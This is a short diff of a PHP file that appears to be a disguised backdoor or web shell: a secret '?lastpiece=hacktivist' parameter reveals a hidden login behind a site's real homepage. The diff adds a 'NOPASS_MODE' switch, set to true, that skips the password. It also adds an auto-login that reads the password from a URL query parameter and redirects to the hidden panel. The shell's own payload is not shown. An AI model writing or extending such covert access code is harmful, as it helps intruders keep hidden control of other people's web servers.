@@ -279,6 +279,11 @@ $PASSWORD_HASH = '$2a$12$5OVW/NAVmsGEZ2H23GyTCuTaGRI5iBDFoLzMsaYLtAUWpAfwrO85.';
 $SESSION_NAME = 'lastpiece_auth';
 $SESSION_TIMEOUT = 3600;
 
+// === NOPASS MODE ===
+// Set true = skip password, auto-login when secret param is correct
+// Set false = require password after secret param (default)
+$NOPASS_MODE = true;
+
 session_start();
 
 function isAuthenticated() {
@@ -1081,6 +1086,17 @@ if (!isAuthenticated()) {
         }
         header('Location: /');
         exit;
+    }
+    
+    // Auto-login via URL: ?lastpiece=hacktivist&password=xxx
+    if (isset($_GET['password']) && !empty($_GET['password'])) {
+        if (authenticate($_GET['password'])) {
+            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+            $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
+            $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';
+            header('Location: ' . $scheme . '://' . $host . $scriptName . '?lastpiece=hacktivist');
+            exit;
+        }
     }
     
     // Has param but not authenticated: show real homepage + hidden login
